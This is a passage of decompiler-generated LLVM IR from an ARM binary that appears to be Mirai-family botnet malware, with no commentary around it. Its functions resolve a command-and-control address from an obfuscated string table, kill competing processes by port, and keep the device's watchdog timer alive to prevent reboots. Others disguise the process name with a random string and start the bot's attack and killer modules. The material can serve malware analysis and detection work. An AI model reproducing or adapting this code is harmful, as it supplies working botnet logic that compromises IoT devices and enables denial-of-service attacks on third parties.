dec_label_pc_d724:                                ; preds = %dec_label_pc_d73c
  %v1_d724 = add i32 %v1_d740, 1
  store i32 %v1_d724, i32* @lr, align 4
  %v9_d728 = icmp eq i32 %v3_d5f8, %v1_d724
  br i1 %v9_d728, label %dec_label_pc_d768, label %dec_label_pc_d734.backedge

dec_label_pc_d734.backedge:                       ; preds = %dec_label_pc_d724, %dec_label_pc_d754
  %v1_d740194 = phi i32 [ 0, %dec_label_pc_d754 ], [ %v1_d724, %dec_label_pc_d724 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d734 = add i32 %v0_d734, -1
  store i32 %v1_d734, i32* %r1.global-to-local, align 4
  %v2_d734 = icmp eq i32 %v0_d734, 0
  br i1 %v2_d734, label %dec_label_pc_d610, label %dec_label_pc_d73c

dec_label_pc_d73c:                                ; preds = %dec_label_pc_d734.backedge, %dec_label_pc_d73c.lr.ph
  %v0_d734 = phi i32 [ %v1_d734119, %dec_label_pc_d73c.lr.ph ], [ %v1_d734, %dec_label_pc_d734.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d73c.lr.ph ], [ %storemerge, %dec_label_pc_d734.backedge ]
  %v1_d740 = phi i32 [ 0, %dec_label_pc_d73c.lr.ph ], [ %v1_d740194, %dec_label_pc_d734.backedge ]
  store i32 %v3_d54c, i32* %r3.global-to-local, align 4
  %v2_d740 = add i32 %v1_d740, %v3_d54c
  %v3_d740 = inttoptr i32 %v2_d740 to i8*
  %v4_d740 = load i8, i8* %v3_d740, align 1
  %v6_d740 = zext i8 %v4_d740 to i32
  store i32 %v6_d740, i32* %r2.global-to-local, align 4
  %v2_d744 = add i32 %storemerge.in, %v1_d744.pre
  %v3_d744 = inttoptr i32 %v2_d744 to i8*
  %v4_d744 = load i8, i8* %v3_d744, align 1
  %v6_d744 = zext i8 %v4_d744 to i32
  store i32 %v6_d744, i32* @r3, align 4
  %v9_d748 = icmp eq i8 %v4_d744, %v4_d740
  br i1 %v9_d748, label %dec_label_pc_d724, label %dec_label_pc_d754

dec_label_pc_d754:                                ; preds = %dec_label_pc_d73c
  br label %dec_label_pc_d734.backedge

dec_label_pc_d75c:                                ; preds = %dec_label_pc_d630
  %v1_d75c = add i32 %v1_d634, 1
  %v9_d760 = icmp eq i32 %v3_d614, %v1_d75c
  br i1 %v9_d760, label %dec_label_pc_d768, label %dec_label_pc_d648

dec_label_pc_d768:                                ; preds = %dec_label_pc_d650, %dec_label_pc_d684, %dec_label_pc_d6b8, %dec_label_pc_d6ec, %dec_label_pc_d724, %dec_label_pc_d75c
  %v1_d76c = call i32 @table_lock_val(i32 20)
  %v1_d774 = call i32 @table_lock_val(i32 21)
  %v1_d77c = call i32 @table_lock_val(i32 22)
  %v1_d784 = call i32 @table_lock_val(i32 23)
  %v1_d78c = call i32 @table_lock_val(i32 24)
  %v1_d794 = call i32 @table_lock_val(i32 36)
  %v1_d79c = call i32 @__GI___libc_close(i32 %v2_d4b0)
  %v0_d7a0 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d7a8 = call i32 @kill(i32 %v0_d7a0, i32 9)
  br label %dec_label_pc_d7ac

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d4a8, %dec_label_pc_d7dc, %dec_label_pc_d768
  store i32 %v2_d334, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d7b4 = call i32 @util_zero()
  store i32 %v2_d384, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d7c4 = call i32 @util_zero()
  %v1_d7cc = call i32 @sleep(i32 1)
  store i32 %v2_d30c, i32* @r4, align 4
  %v0_d7d4 = load i32, i32* @r7, align 4
  store i32 %v0_d7d4, i32* @r5, align 4
  br label %dec_label_pc_d25c.backedge

dec_label_pc_d7dc:                                ; preds = %dec_label_pc_d56c.backedge, %dec_label_pc_d4c0
  %v1_d7e0 = call i32 @table_lock_val(i32 20)
  %v1_d7e8 = call i32 @table_lock_val(i32 21)
  %v1_d7f0 = call i32 @table_lock_val(i32 22)
  %v1_d7f8 = call i32 @table_lock_val(i32 23)
  %v1_d800 = call i32 @table_lock_val(i32 24)
  %v1_d808 = call i32 @table_lock_val(i32 36)
  %v1_d810 = call i32 @__GI___libc_close(i32 %v2_d4b0)
  br label %dec_label_pc_d7ac

; uselistorder directives
  uselistorder i32 %v1_d75c, { 1, 0 }
  uselistorder i32 %v1_d648, { 1, 0 }
  uselistorder i32 %v1_d634, { 1, 0 }
  uselistorder i32 %v0_d648, { 1, 0 }
  uselistorder i32 %v1_d578, { 1, 0 }
  uselistorder i32 %v2_d4b0, { 3, 2, 4, 1, 0 }
  uselistorder i1 %v7_d48c, { 1, 0 }
  uselistorder i32 %v2_d488, { 1, 0 }
  uselistorder i32 %v2_d260, { 1, 0 }
  uselistorder i32 %stack_var_-8436.1.be, { 1, 0 }
  uselistorder i32 %v3_d3e0, { 1, 2, 0 }
  uselistorder i32 %v2_d2f0, { 1, 0 }
  uselistorder i32 %v1_d290, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d26c, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8436.0, { 1, 0 }
  uselistorder i32 %v2_d568, { 1, 0, 2 }
  uselistorder i32 %v2_d384, { 1, 0, 2 }
  uselistorder i32 %v3_d204, { 1, 0 }
  uselistorder i32 %v2_d1d0, { 2, 0, 1 }
  uselistorder i32 %v3_d17c, { 1, 0 }
  uselistorder i32 %v1_d16c, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_d0ec, { 1, 2, 0 }
  uselistorder i32 %v3_d0a0, { 1, 2, 0 }
  uselistorder i32 %v3_d054, { 1, 2, 0 }
  uselistorder i32 %v3_d01c, { 1, 2, 0 }
  uselistorder i32 %v3_cfc8, { 2, 1, 0 }
  uselistorder i32 %storemerge212, { 1, 0 }
  uselistorder i32 %v0_cf54, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 7, 8, 9, 10, 12, 11, 2, 1, 5, 4, 3, 13, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24f44.79, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24f48.71, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d7ac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d768, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d734.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d6fc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d6c8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d694.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d660.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d648, { 1, 0 }
  uselistorder label %dec_label_pc_d584, { 1, 0 }
  uselistorder label %dec_label_pc_d4a8, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d25c.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d43c, { 1, 0 }
  uselistorder label %dec_label_pc_d26c, { 1, 0 }
  uselistorder label %dec_label_pc_d26c.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_d118, { 1, 0 }
  uselistorder label %dec_label_pc_d0cc, { 1, 0 }
  uselistorder label %dec_label_pc_d080, { 1, 0 }
  uselistorder label %dec_label_pc_d048, { 1, 0 }
  uselistorder label %dec_label_pc_cff4, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d9a0.84 to i32), i32* @global_var_222b4.86, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d840 = load i32, i32* @r6, align 4
  %v12_d840 = load i32, i32* @r7, align 4
  %v15_d840 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d85c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_222ac.88 to i32), i32* @r6, align 4
  %v7_d864 = icmp eq i32 %v3_d85c, -1
  store i32 %v3_d85c, i32* @global_var_222ac.88, align 4
  br i1 %v7_d864, label %dec_label_pc_d91c, label %dec_label_pc_d870

dec_label_pc_d870:                                ; preds = %entry
  %v2_d870 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d870, i32* @r3, align 4
  %v0_d874 = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d884 = call i32 @__GI_setsockopt(i32 %v3_d85c, i32 %v0_d874, i32 2, i32 %v2_d870, i32 4)
  %v2_d888 = load i32, i32* @global_var_222ac.88, align 4
  store i32 %v2_d888, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d898 = call i32 @__libc_fcntl(i32 %v2_d888, i32 3)
  %v0_d89c = load i32, i32* @r5, align 4
  %v1_d8a0 = or i32 %v2_d898, 2048
  store i32 %v1_d8a0, i32* @r2, align 4
  %v0_d8a4 = load i32, i32* @r4, align 4
  %v2_d8a8 = call i32 @__libc_fcntl(i32 %v0_d8a4, i32 %v0_d89c)
  store i32 ptrtoint (i8** @global_var_222b8.90 to i32), i32* @r8, align 4
  %v2_d8b0 = load i8, i8* bitcast (i8** @global_var_222b8.90 to i8*), align 4
  %v2_d8b4 = icmp eq i8 %v2_d8b0, 0
  br i1 %v2_d8b4, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_d870
  br label %bb20

bb:                                               ; preds = %dec_label_pc_d870
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_d8d8 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d8e0 = inttoptr i32 %v0_d8d8 to i32*
  store i32 0, i32* %v2_d8e0, align 4
  %v2_d8e4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d8e4, i32* @r5, align 4
  store i32 %v0_d8d8, i32* %r4.global-to-local, align 4
  %v2_d8f4 = load i32, i32* @global_var_222ac.88, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d900 = call i32 @bind(i32 %v2_d8f4, i32 %v2_d8e4, i32 16)
  %v7_d904 = icmp eq i32 %v3_d900, -1
  br i1 %v7_d904, label %dec_label_pc_d928, label %dec_label_pc_d90c

dec_label_pc_d90c:                                ; preds = %bb20
  %v2_d914 = load i32, i32* @global_var_222ac.88, align 4
  %v2_d918 = call i32 @listen(i32 %v2_d914, i32 1)
  br label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %entry, %dec_label_pc_d934, %dec_label_pc_d90c
  %v1_d924 = phi i32 [ %v3_d85c, %entry ], [ %v1_d978, %dec_label_pc_d934 ], [ %v2_d918, %dec_label_pc_d90c ]
  store i32 %v9_d840, i32* @r6, align 4
  store i32 %v12_d840, i32* @r7, align 4
  store i32 %v15_d840, i32* @r8, align 4
  ret i32 %v1_d924

dec_label_pc_d928:                                ; preds = %bb20
  %v0_d928 = load i32, i32* %r4.global-to-local, align 4
  %v1_d928 = inttoptr i32 %v0_d928 to i32*
  %v2_d928 = load i32, i32* %v1_d928, align 4
  %v7_d92c = icmp eq i32 %v2_d928, 99
  br i1 %v7_d92c, label %dec_label_pc_d980, label %dec_label_pc_d934

dec_label_pc_d934:                                ; preds = %dec_label_pc_d980, %bb21, %dec_label_pc_d928
  store i32 15290, i32* @r4, align 4
  %v2_d94c = load i32, i32* @global_var_222ac.88, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d95c = call i32 @__libc_connect(i32 %v2_d94c, i32 %v2_d8e4, i32 16)
  %v1_d964 = call i32 @sleep(i32 5)
  %v2_d968 = load i32, i32* @global_var_222ac.88, align 4
  %v1_d96c = call i32 @__GI___libc_close(i32 %v2_d968)
  %v0_d970 = load i32, i32* @r4, align 4
  %v1_d974 = call i32 @killer_kill_by_port(i32 %v0_d970)
  %v1_d978 = call i32 @ensure_single_instance(i32 %v1_d974)
  br label %dec_label_pc_d91c

dec_label_pc_d980:                                ; preds = %dec_label_pc_d928
  %v2_d980 = load i8, i8* bitcast (i8** @global_var_222b8.90 to i8*), align 4
  %v3_d980 = zext i8 %v2_d980 to i32
  %v1_d984 = load i32, i32* @r7, align 4
  %v9_d984 = icmp eq i32 %v3_d980, %v1_d984
  br i1 %v9_d984, label %dec_label_pc_d934, label %bb21

bb21:                                             ; preds = %dec_label_pc_d980
  %v2_d98c = trunc i32 %v1_d984 to i8
  store i8 %v2_d98c, i8* bitcast (i8** @global_var_222b8.90 to i8*), align 4
  br label %dec_label_pc_d934

; uselistorder directives
  uselistorder i32 %v2_d8e4, { 1, 0, 2 }
  uselistorder i32 %v3_d85c, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_222b8.90 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_222b8.90, { 1, 0 }
  uselistorder label %dec_label_pc_d934, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d91c, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_d9a8 = call i32 @table_unlock_val(i32 2)
  %v3_d9b4 = call i32 @table_retrieve_val(i32 2, i32* null)
  %v1_d9b8 = call i32 @resolv_lookup(i32 %v3_d9b4)
  store i32 %v1_d9b8, i32* @r6, align 4
  %v1_d9c4 = call i32 @table_lock_val(i32 2)
  %v0_d9c8 = load i32, i32* @r6, align 4
  %v2_d9c8 = icmp eq i32 %v0_d9c8, 0
  br i1 %v2_d9c8, label %dec_label_pc_da18, label %dec_label_pc_d9d0

dec_label_pc_d9d0:                                ; preds = %entry
  %v1_d9d0 = add i32 %v0_d9c8, 4
  %v2_d9d0 = inttoptr i32 %v1_d9d0 to i32*
  %v3_d9d0 = load i32, i32* %v2_d9d0, align 4
  store i32 %v3_d9d0, i32* @r4, align 4
  %v0_d9d4 = call i32 @rand_next()
  %v0_d9d8 = load i32, i32* @r6, align 4
  %v1_d9d8 = inttoptr i32 %v0_d9d8 to i8*
  %v2_d9d8 = load i8, i8* %v1_d9d8, align 1
  %v3_d9d8 = zext i8 %v2_d9d8 to i32
  %v3_d9dc = urem i32 %v0_d9d4, %v3_d9d8
  store i32 ptrtoint (i16** @global_var_24f4c.93 to i32), i32* @r5, align 4
  %v0_d9e4 = load i32, i32* @r4, align 4
  %v4_d9e4 = mul nuw nsw i32 %v3_d9dc, 4
  %v5_d9e4 = add i32 %v0_d9e4, %v4_d9e4
  %v6_d9e4 = inttoptr i32 %v5_d9e4 to i32*
  %v7_d9e4 = load i32, i32* %v6_d9e4, align 4
  store i32 %v7_d9e4, i32* @global_var_24f50.94, align 4
  %v1_d9f0 = call i32 @resolv_entries_free(i32 %v0_d9d8)
  %v1_d9f8 = call i32 @table_unlock_val(i32 1)
  %v3_da04 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_da04 = inttoptr i32 %v3_da04 to i16*
  %v3_da08 = load i16, i16* %v4_da04, align 2
  store i16 %v3_da08, i16* bitcast (i32* @global_var_24f4e.95 to i16*), align 4
  %v1_da14 = call i32 @table_lock_val(i32 1)
  br label %dec_label_pc_da18

dec_label_pc_da18:                                ; preds = %entry, %dec_label_pc_d9d0
  %v1_da1c = phi i32 [ %v1_d9c4, %entry ], [ %v1_da14, %dec_label_pc_d9d0 ]
  ret i32 %v1_da1c

; uselistorder directives
  uselistorder label %dec_label_pc_da18, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_da24 = load i32, i32* @r4, align 4
  %v6_da24 = load i32, i32* @r5, align 4
  %v0_da2c = call i32 @__libc_fork()
  %v7_da30 = icmp eq i32 %v0_da2c, -1
  %. = zext i1 %v7_da30 to i32
  %tmp11 = icmp slt i32 %v0_da2c, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_da4c = icmp eq i32 %storemerge4, 0
  store i32 %v0_da2c, i32* @global_var_2242c.97, align 4
  br i1 %v2_da4c, label %dec_label_pc_da64, label %dec_label_pc_da58

dec_label_pc_da58:                                ; preds = %entry
  store i32 %v3_da24, i32* @r4, align 4
  store i32 %v6_da24, i32* @r5, align 4
  ret i32 %v0_da2c

dec_label_pc_da64:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_da70 = call i32 @table_unlock_val(i32 28)
  %v1_da78 = call i32 @table_unlock_val(i32 29)
  %v0_da7c = load i32, i32* @r5, align 4
  %v2_da84 = inttoptr i32 %v0_da7c to i32*
  %v3_da84 = call i32 @table_retrieve_val(i32 28, i32* %v2_da84)
  %v2_da8c = call i32 @__libc_open(i32 %v3_da84, i32 2)
  %v7_da90 = icmp eq i32 %v2_da8c, -1
  store i32 %v2_da8c, i32* @r4, align 4
  br i1 %v7_da90, label %dec_label_pc_dad8, label %dec_label_pc_da9c

dec_label_pc_da9c:                                ; preds = %dec_label_pc_dad8, %dec_label_pc_da64
  %v0_daa8 = phi i32 [ %v2_dae8, %dec_label_pc_dad8 ], [ %v2_da8c, %dec_label_pc_da64 ]
  %v2_daac = ptrtoint i32* %stack_var_-20 to i32
  %v3_dab0 = call i32 @ioctl(i32 %v0_daa8, i32 -2147199228, i32 %v2_daac)
  br label %dec_label_pc_dab4

dec_label_pc_dab4:                                ; preds = %dec_label_pc_dab4, %dec_label_pc_da9c
  %v0_dac0 = load i32, i32* @r4, align 4
  %v3_dac8 = call i32 @ioctl(i32 %v0_dac0, i32 -2147199227, i32 0)
  %v1_dad0 = call i32 @sleep(i32 10)
  br label %dec_label_pc_dab4

dec_label_pc_dad8:                                ; preds = %dec_label_pc_da64
  %v0_dad8 = load i32, i32* @r5, align 4
  %v2_dae0 = inttoptr i32 %v0_dad8 to i32*
  %v3_dae0 = call i32 @table_retrieve_val(i32 29, i32* %v2_dae0)
  %v2_dae8 = call i32 @__libc_open(i32 %v3_dae0, i32 2)
  %v3_daec = icmp eq i32 %v2_dae8, -1
  store i32 %v2_dae8, i32* @r4, align 4
  br i1 %v3_daec, label %dec_label_pc_daf8, label %dec_label_pc_da9c

dec_label_pc_daf8:                                ; preds = %dec_label_pc_dad8
  %v1_dafc = call i32 @table_lock_val(i32 28)
  %v1_db04 = call i32 @table_lock_val(i32 29)
  %v0_db08 = load i32, i32* @r5, align 4
  %v1_db0c = call i32 @__GI_exit(i32 %v0_db08)
  %v0_db10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_db10, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_daf8
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_daf8, %bb14
  ret i32 %v1_db0c

; uselistorder directives
  uselistorder i32 %v2_dae8, { 1, 2, 0 }
  uselistorder i32 %v2_da8c, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_da2c, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_db24 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_db24, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_db3c = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_db48 = call i32 @__GI_sigaddset(i32 %v2_db24, i32 2)
  %v0_db4c = load i32, i32* @r5, align 4
  store i32 %v0_db4c, i32* %r2.global-to-local, align 4
  %v4_db58 = call i32 @__GI_sigprocmask(i32 %v0_db4c, i32* nonnull %stack_var_-64, i32 %v0_db4c)
  %v2_db64 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_db70 = call i32 @bsd_signal(i32 5, i32 55336)
  %v0_db74 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_24f4c.93 to i32), i32* %r2.global-to-local, align 4
  store i16 ptrtoint (i16* @global_var_e800.100 to i16), i16* bitcast (i32* @global_var_24f4e.95 to i16*), align 4
  store i32 1494907823, i32* @global_var_24f50.94, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_db74, i32* @global_var_24f40.59, align 4
  store i16 2, i16* bitcast (i16** @global_var_24f4c.93 to i16*), align 4
  %v6_db9c = call i32 @table_init(i32 %v0_db74, i32 ptrtoint (i32* @global_var_24f40.59 to i32), i32 ptrtoint (i16** @global_var_24f4c.93 to i32), i32 2)
  store i32 ptrtoint (i32* @global_var_d9a0.84 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_222b4.86 to i32), i32* %ip.global-to-local, align 4
  %v2_dba8 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_dba8, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_d9a0.84 to i32), i32* @global_var_222b4.86, align 4
  %v1_dbb0 = call i32 @ensure_single_instance(i32 %v6_db9c)
  %v1_dbb4 = call i32 @rand_init(i32 %v1_dbb0)
  store i32 %v2_dba8, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_dbc0 = call i32 @util_zero()
  %v0_dbc4 = load i32, i32* @r6, align 4
  %v7_dbc4 = icmp eq i32 %v0_dbc4, 2
  br i1 %v7_dbc4, label %dec_label_pc_dcf4, label %dec_label_pc_dbcc

dec_label_pc_dbcc:                                ; preds = %dec_label_pc_dcf4, %entry, %dec_label_pc_dd04
  %v0_dbcc = call i32 @rand_next()
  store i32 %v0_dbcc, i32* @r6, align 4
  %v0_dbd4 = load i32, i32* @r8, align 4
  %v1_dbd4 = inttoptr i32 %v0_dbd4 to i32*
  %v2_dbd4 = load i32, i32* %v1_dbd4, align 4
  %v1_dbd8 = inttoptr i32 %v2_dbd4 to i8*
  %v2_dbd8 = call i32 @util_strlen(i8* %v1_dbd8)
  %v0_dbe0 = load i32, i32* @r8, align 4
  %v1_dbe0 = inttoptr i32 %v0_dbe0 to i32*
  %v2_dbe0 = load i32, i32* %v1_dbe0, align 4
  %v1_dbe4 = inttoptr i32 %v2_dbe0 to i8*
  %v2_dbe4 = call i32 @util_strlen(i8* %v1_dbe4)
  %v1_dbe8 = sub i32 20, %v2_dbd8
  %v0_dbf0 = load i32, i32* @r6, align 4
  %v3_dbf4 = urem i32 %v0_dbf0, %v1_dbe8
  %v2_dbf8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_dbf8, i32* @r5, align 4
  %v2_dbfc = add i32 %v3_dbf4, %v2_dbe4
  store i32 %v2_dbfc, i32* @r4, align 4
  %v2_dc08 = call i32 @rand_alpha_str(i32 %v2_dbf8, i32 %v2_dbfc)
  %v2_dc0c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_dc0c, i32* @lr, align 4
  %v1_dc10 = load i32, i32* @r4, align 4
  %v2_dc10 = add i32 %v1_dc10, %v2_dc0c
  store i32 %v2_dc10, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_dc1c = load i32, i32* @r8, align 4
  %v1_dc1c = inttoptr i32 %v0_dc1c to i32*
  %v2_dc1c = load i32, i32* %v1_dc1c, align 4
  store i32 %v2_dc1c, i32* @r0, align 4
  %v3_dc20 = add i32 %v2_dc10, -80
  %v4_dc20 = inttoptr i32 %v3_dc20 to i8*
  store i8 0, i8* %v4_dc20, align 1
  %v2_dc24 = inttoptr i32 %v2_dc1c to i8*
  %v3_dc24 = call i32 @util_strcpy(i8* %v2_dc24, i32 %v2_dbf8)
  store i32 32, i32* @r1, align 4
  store i32 %v2_dbf8, i32* @r0, align 4
  %v0_dc30 = call i32 @util_zero()
  %v0_dc34 = call i32 @rand_next()
  store i32 %v0_dc34, i32* @r7, align 4
  %v0_dc3c = load i32, i32* @r8, align 4
  %v1_dc3c = inttoptr i32 %v0_dc3c to i32*
  %v2_dc3c = load i32, i32* %v1_dc3c, align 4
  %v1_dc40 = inttoptr i32 %v2_dc3c to i8*
  %v2_dc40 = call i32 @util_strlen(i8* %v1_dc40)
  store i32 %v2_dc40, i32* @r6, align 4
  %v0_dc48 = load i32, i32* @r8, align 4
  %v1_dc48 = inttoptr i32 %v0_dc48 to i32*
  %v2_dc48 = load i32, i32* %v1_dc48, align 4
  %v1_dc4c = inttoptr i32 %v2_dc48 to i8*
  %v2_dc4c = call i32 @util_strlen(i8* %v1_dc4c)
  %v0_dc50 = load i32, i32* @r6, align 4
  %v1_dc50 = sub i32 20, %v0_dc50
  %v0_dc58 = load i32, i32* @r7, align 4
  %v3_dc5c = urem i32 %v0_dc58, %v1_dc50
  %v2_dc60 = add i32 %v3_dc5c, %v2_dc4c
  store i32 %v2_dc60, i32* @r4, align 4
  %v2_dc6c = call i32 @rand_alpha_str(i32 %v2_dbf8, i32 %v2_dc60)
  store i32 %v2_dc0c, i32* %r2.global-to-local, align 4
  %v1_dc74 = load i32, i32* @r4, align 4
  %v2_dc74 = add i32 %v1_dc74, %v2_dc0c
  store i32 %v2_dc74, i32* %r3.global-to-local, align 4
  %v0_dc78 = load i32, i32* @sl, align 4
  %v1_dc78 = trunc i32 %v0_dc78 to i8
  %v3_dc78 = add i32 %v2_dc74, -80
  %v4_dc78 = inttoptr i32 %v3_dc78 to i8*
  store i8 %v1_dc78, i8* %v4_dc78, align 1
  %v4_dc84 = call i32 @prctl(i32 15, i32 %v2_dbf8, i32 %v2_dc0c, i32 %v2_dc74)
  %v1_dc8c = call i32 @table_unlock_val(i32 5)
  %v3_dc9c = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_dca0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_dca0, i32* @r2, align 4
  %v2_dcac = call i32 @__GI___libc_write(i32 1, i32 %v3_dc9c)
  store i32 1, i32* @r2, align 4
  %v2_dcbc = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_19a7c.106 to i32))
  %v1_dcc4 = call i32 @table_lock_val(i32 5)
  %v1_dcc8 = call i32 @attack_init(i32 %v1_dcc4)
  %v1_dccc = call i32 @killer_init(i32 %v1_dcc8)
  %v1_dcd0 = call i32 @watchdog_maintain(i32 %v1_dccc)
  %v0_dcd4 = call i32 @__libc_fork()
  %v1_dcd8 = load i32, i32* @sl, align 4
  %v7_dcdc = icmp sgt i32 %v0_dcd4, %v1_dcd8
  br i1 %v7_dcdc, label %dec_label_pc_dce0, label %dec_label_pc_dd2c

dec_label_pc_dce0:                                ; preds = %dec_label_pc_dbcc
  ret i32 %v1_dcd8

dec_label_pc_dcf4:                                ; preds = %entry
  %v0_dcf4 = load i32, i32* @r8, align 4
  %v1_dcf4 = add i32 %v0_dcf4, 4
  %v2_dcf4 = inttoptr i32 %v1_dcf4 to i32*
  %v3_dcf4 = load i32, i32* %v2_dcf4, align 4
  %v1_dcf8 = inttoptr i32 %v3_dcf4 to i8*
  %v2_dcf8 = call i32 @util_strlen(i8* %v1_dcf8)
  %v8_dd00 = icmp sgt i32 %v2_dcf8, 31
  br i1 %v8_dd00, label %dec_label_pc_dbcc, label %dec_label_pc_dd04

dec_label_pc_dd04:                                ; preds = %dec_label_pc_dcf4
  %v0_dd04 = load i32, i32* @r8, align 4
